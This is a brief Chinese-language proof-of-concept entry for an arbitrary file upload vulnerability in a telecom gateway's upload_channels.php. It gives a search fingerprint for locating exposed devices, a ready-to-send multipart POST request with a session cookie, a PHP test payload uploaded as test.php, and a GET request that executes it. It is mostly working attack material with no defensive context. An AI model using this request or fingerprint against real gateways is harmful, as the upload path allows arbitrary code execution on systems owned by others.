# 电信网关upload_channels.php任意文件上传漏洞

- **系统**：电信网关upload_channels.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="a:link{text-decoration:none;color:orange;}"`
- **请求**：`POST /bak_manager/upload_channels.php HTTP/1.1`
- **关键头**：`Content-Length: 217`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWn…`　`Cookie: __s_sessionid__=j9pa09if69ibfcq7qu3lhd5j83`

**请求体 / payload**
```
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="name";filename="test.php"
Content-Type: text/plain
<?php echo(md5(233));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
GET /bak_manager/test.php HTTP/1.1
Host:
Cookie: __s_sessionid__=j9pa09if69ibfcq7qu3lhd5j83
```
- **预期**：200　|　—